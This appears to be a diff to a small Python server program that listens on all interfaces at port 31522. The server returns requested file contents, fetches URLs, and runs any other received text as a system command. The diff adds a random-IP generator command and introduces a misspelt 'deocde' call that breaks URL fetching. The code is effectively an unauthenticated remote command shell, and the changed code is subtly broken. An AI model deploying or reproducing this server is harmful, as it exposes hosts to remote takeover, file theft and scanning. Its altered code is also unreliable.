@@ -8,12 +8,13 @@
 
 import sys
 import socket
+import random
 import subprocess
 import threading
 import urllib.request
 import os
 
-__version__ = "1.0"
+__version__ = "1.1-beta"
 
 class Server:
     def __init__(self, host='0.0.0.0', port=31522, blacklist_file=None):
@@ -75,6 +76,7 @@ class Server:
 
         if cmd == "get": return self.get_file_content(' '.join(command.split()[1:]))
         elif cmd == "http": return self.fetch_url(' '.join(command.split()[1:]))
+        elif cmd == "genip": return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
         else: return self.execute_command(command)
 
     def get_file_content(self, filename):
@@ -96,7 +98,7 @@ class Server:
             return "URL is missing."
         try:
             with urllib.request.urlopen(url) as response:
-                return response.read().decode('utf-8')
+                return response.read().deocde('utf-8')
         except Exception as e:
             return f"Error accessing URL: {e}"
 
